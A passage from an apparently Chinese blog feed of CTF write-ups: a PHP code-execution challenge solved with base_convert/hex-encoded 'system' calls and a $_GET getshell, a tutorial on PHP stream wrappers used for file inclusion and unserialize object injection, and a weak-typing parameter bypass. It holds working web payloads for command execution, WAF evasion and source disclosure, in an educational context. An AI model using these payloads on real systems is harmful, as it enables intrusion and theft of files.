<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">// cat * 的十六进制为 636174202a</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">hexdec</span>(<span class="string">&#x27;636174202a&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="number">426836762666</span>));</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj6d6oj30fr0ce758.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj6d6oj30fr0ce758.jpg" class="lazyload"></a></p>
<p>payload如下:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">426836762666</span>)))</span><br></pre></td></tr></table></figure></div>

<hr>
<p>但是长度超了， 需要想办法缩短字符<br>通过百度， 发现 <code>nl</code> 命令也可以读取文件<br>fuzz <code>hex2bin</code> 的进制数发现 <code>1438255411</code> 更短</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aofmj30eg06oglx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aofmj30eg06oglx.jpg" class="lazyload"></a></p>
<p>最终 Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">1438255411</span>,<span class="number">14</span>,<span class="number">34</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1852579882</span>)))</span><br></pre></td></tr></table></figure></div>

<p>得到<strong>flag</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjbep2j30yd0hy414.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjbep2j30yd0hy414.jpg" class="lazyload"></a></p>
<hr>
<h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><p>由解法1可以知道，可以异或出 <code>_</code>， 而且 ‘$’ 没有被waf， 我们可以使用 <code>$_GET</code>全局变量手动传入参数来 getshell;<br>虽然 <code>[]</code> 被waf了， 但是可以用 <code>&#123;&#125;</code> 来提取数组中的值.<br>通过上述的脚本,可以得到<br><code>1^n=_; 5^r=G; 1^t=E; 7^c=T</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138dfr7j30dm09a0t3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138dfr7j30dm09a0t3.jpg" class="lazyload"></a></p>
<p>不难构造出<br><code>$pi=base_convert;$pi=$pi(53179,10,36)^$pi(1109136,10,36);$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)</code></p>
<p>payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>=system&amp;<span class="number">1</span>=cat flag.php&amp;c=<span class="variable">$pi</span>=base_convert;<span class="variable">$pi</span>=<span class="variable">$pi</span>(<span class="number">53179</span>,<span class="number">10</span>,<span class="number">36</span>)^<span class="variable">$pi</span>(<span class="number">1109136</span>,<span class="number">10</span>,<span class="number">36</span>);$&#123;<span class="variable">$pi</span>&#125;&#123;<span class="number">0</span>&#125;($&#123;<span class="variable">$pi</span>&#125;&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="number">0</span>=show_source&amp;<span class="number">1</span>=flag.php&amp;c=<span class="variable">$pi</span>=base_convert;<span class="variable">$pi</span>=<span class="variable">$pi</span>(<span class="number">53179</span>,<span class="number">10</span>,<span class="number">36</span>)^<span class="variable">$pi</span>(<span class="number">1109136</span>,<span class="number">10</span>,<span class="number">36</span>);$&#123;<span class="variable">$pi</span>&#125;&#123;<span class="number">0</span>&#125;($&#123;<span class="variable">$pi</span>&#125;&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aof9j30mt05cmxe.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138aof9j30mt05cmxe.jpg" class="lazyload"></a></p>
<hr>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>最近状态有所松懈，注意休息，安心学习，努力静下心来</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议在CTF的应用</title>
    <url>/yakko117/2019/07/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PHP伪协议-lt-转-gt"><a href="#PHP伪协议-lt-转-gt" class="headerlink" title="PHP伪协议&lt;转&gt;"></a>PHP伪协议&lt;转&gt;</h1><p>PHP支持的伪协议如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file: <span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http: <span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp: <span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php: <span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib: <span class="comment">// — 压缩流</span></span><br><span class="line">data: <span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob: <span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar: <span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2: <span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar: <span class="comment">// — RAR</span></span><br><span class="line">ogg: <span class="comment">// — 音频流</span></span><br><span class="line">expect: <span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="PHP-ini"><a href="#PHP-ini" class="headerlink" title="PHP.ini"></a>PHP.ini</h2><p>在<code>php.ini</code>里有两个重要的参数<code>allow_url_fopen</code> 和 <code>allow_url_include</code></p>
<p><code>allow_url_fopen</code> : 默认值是ON，允许URL里的封装协议访问文件</p>
<p><code>allow_url_include</code> : 默认值是OFF，不允许包含URL里的封装协议包含文件</p>
<hr>
<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</p>
<p><code>php://filter</code> 是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似 <code>readfile()、file()、file_get_contents()</code>，在数据流读取之前没有机会使用其他过滤器。</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">resource&#x3D;<em>&lt;要过滤的数据流&gt;</em></td>
<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td align="center">read&#x3D;<em>&lt;读链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符分隔</td>
</tr>
<tr>
<td align="center">write&#x3D;<em>&lt;写链的筛选列表&gt;</em></td>
<td align="left">该参数可选。可以设定一个或多个过滤器名称，同样以管道符分隔</td>
</tr>
<tr>
<td align="center">&lt;；两个链的筛选列表&gt;</td>
<td align="left">任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/[read/write]=string.[rot1/strip_tags/…..]/resource=xxx</span></span><br></pre></td></tr></table></figure></div>

<p><code>filter</code> 和 <code>string</code> 过滤器连用可以对字符串进行过滤。<code>filter</code> 的<code>read</code> 和 <code>write</code> 参数有不同的应用场景。<code>read</code>用于 <code>include()</code>和 <code>file_get_contents()</code>，<code>write</code> 用于 <code>file_put_contents()</code> 中。</p>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-[encode/decode]/resource=xxx</span></span><br></pre></td></tr></table></figure></div>
<p>这是使用的过滤器是 <code>convert.base64-encode</code>.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据</p>
<hr>
<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p><code>php://input</code> 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为 <code>php://input</code>，同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
<p>需要开启<code>allow_url_include</code></p>
<p>(PS:当<code>enctype=&quot;multipart/form-data&quot;</code>时，<code>php://input</code>是无效的。)</p>
<hr>
<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p><code>file://</code> 伪协议在双OFF的时候也可以用，用于本地文件包含.</p>
<p>(PS: <code>file://</code> 协议必须是绝对路径)</p>
<hr>
<h2 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phar:<span class="comment">//test.[zip/jpg/png…]/file.txt</span></span><br></pre></td></tr></table></figure></div>
<p>其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为<code>phar://test.test/file.txt</code> 也可以运行。</p>
<hr>
<h2 id="zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F"><a href="#zip-x2F-x2F-bzip2-x2F-x2F-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</h2><p>在双OFF的时候也可以用</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip:<span class="comment">//test.zip%23file.txt</span></span><br></pre></td></tr></table></figure></div>
<p>和 <code>phar://</code>一样用于读取压缩文件，不过对于 <code>zip://test.zip#file.txt</code> 中的<code>#</code>要编码为<code>%23</code>.因为url的#后的内容不会被传送</p>
<hr>
<h1 id="举个栗子吧"><a href="#举个栗子吧" class="headerlink" title="举个栗子吧"></a>举个栗子吧</h1><p>在本地复现了bugku的一道题目(因为原题挂了qvq)<br>原题题目：<a href="http://120.24.86.145:8006/test1/">http://120.24.86.145:8006/test1/</a></p>
<p>在拿到题目后 首先查看源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>

<p>分析一下源码</p>
<ol>
<li>get方式传入三个参数：<code>txt</code>，<code>file</code>，<code>password</code></li>
<li><code>file_get_contents()</code>函数的作用是将<code>$user</code>的内容读取出来，在此即为将user读取出来的内容数值与类型全等welcome to the bugkuctf。（&#x3D;&#x3D;&#x3D;）</li>
<li>如果满足if条件，则打印输出”hello admin!”。并且将包含的<code>hint.php</code>内容显示出来</li>
</ol>
<p>在此，可以运用两个PHP的伪协议<br>1.<code>php://filter</code> ：可以进行任意文件的读取。<br>有关<code>php://filter</code>的详细了解：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">p神的详解</a><br>2.<code>php://input</code> ：可以读取没有处理过的post数据</p>
<p>通过对以上代码的分析，我们有了解决思路：</p>
<p>对于<code>file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;</code>，我们可以借用php伪协议<code>php://input</code>，要想使user中的字符串读取出来与三等号后的内容一致，就必须使他的传入参数txt，来post  welcome to the bugkuctf<br>再来看<code>include($file); //hint.php </code>。我们可以用<code>php://filter</code>来进行hint.php的base编码，从而可以读取出hint.php的内容。<br>构造payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure></div>

<p>利用bp改包</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut74i4j317l0a2q5p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut74i4j317l0a2q5p.jpg" class="lazyload"></a></p>
<p>发现一组base64,再进行base64解码，发现又有一组代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>看到 <code>flag.php</code>，猜测flag或许就从这段代码中找出。<br>审计代码发现了比较关键的一个函数<code>__tostring()</code>，此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量 <code>$file</code> 作为文件名输出文件内容。而且，还有一个 <code>password</code> 参数没有用上，所以考虑，或许还会存在另一段代码。那就接着上一步，把hint.php换成index.php会有什么发现呢？<br>嘿嘿，发现新的编码</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut9cd6j317g0fbn2a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut9cd6j317g0fbn2a.jpg" class="lazyload"></a></p>
<p>解码后</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure></div>

<p>结果发现了正则匹配函数<code>preg_match(&quot;/flag/&quot;,$file)</code>，对flag进行了正则匹配。<br>再来接着看，else代码块中又一次包含了<code>$file</code>，并且对<code>$password</code>进行反序列化。通过对上述hint.php的解读，我们就可以构造password，password为Flag类型，字符串变量<code>file=flag.php</code>。<br>构造的序列化对象payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>得到flag（&#x3D;v&#x3D; 好吧 php是世界上最好的语言）</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut6kazj30z30a40uv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g58yut6kazj30z30a40uv.jpg" class="lazyload"></a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道题学习php的小特性</title>
    <url>/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>P神，永远滴神~ (抖个机灵）<br>手上还攒着几个问题，一直没怎么花时间去学习，要抓紧时间了</p>
<span id="more"></span>

<h1 id="安恒-奇怪的恐龙特性"><a href="#安恒-奇怪的恐龙特性" class="headerlink" title="[安恒] 奇怪的恐龙特性"></a>[安恒] 奇怪的恐龙特性</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<h1 id="首先先看一下p神的说法"><a href="#首先先看一下p神的说法" class="headerlink" title="首先先看一下p神的说法"></a>首先先看一下p神的说法</h1><pre><code>我一直在思考，假设我有一个办法，在第一次WAF检测参数的时候，检测的是22222，但后面覆盖request的时候，拿到的是11111，那么不就可以造成WAF的绕过了么？但上述两个实验的结果表示，我这个假设是不成立的。二者获取的结果都是22222 。那么，这个思路是否就是不可行的了？
</code></pre>
<p><code>php</code> 自身在解析请求的时候，如果参数名字中包含 <code>&quot; &quot;</code>、<code>&quot;.&quot;</code>、<code>&quot;[&quot;</code> 这几个字符，会将他们转换成 <code>_</code> 。<br>那么假设我发送的是这样一个请求： <code>/t.php?user_id=11111&amp;user.id=22222</code> <code>php</code> 先将 <code>user.id</code> 转换成 <code>user_id</code> 即为 <code>/t.php?user_id=11111&amp;user_id=22222</code> 再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。<br>可在 <code>$_SERVER[&#39;REQUEST_URI&#39;]</code> 中 <code>user_id</code> 和<code>user.id</code>却是两个完全不同的参数名，切割覆盖后，获取的 <code>$_REQUEST[&#39;user_id&#39;]</code> 却是 <code>11111</code>。</p>
<p>然后再看题目</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>利用数字绕过：数组永远比数字大，永远比数字大</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# php -r &quot;@var_dump(admin==0);&quot;</span><br><span class="line">bool(true)</span><br><span class="line">root@kali:~# php -r &quot;var_dump([]&gt;999999999999999999999);&quot;</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure></div>

<p>第二个判断是强制转化为字符串再与数字比较的判断</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>简单的弱类型绕过了，让参数等于某个字符串，例如：<code>admin</code> 就可以了，因为<code>admin== 0</code>，结果是<code>true</code>，直接等于0绕过，最后的Payload:</p>
<p><code>?A+A[]=admin</code>w</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 爬虫学习记录</title>
    <url>/yakko117/2020/02/28/pySpider/</url>
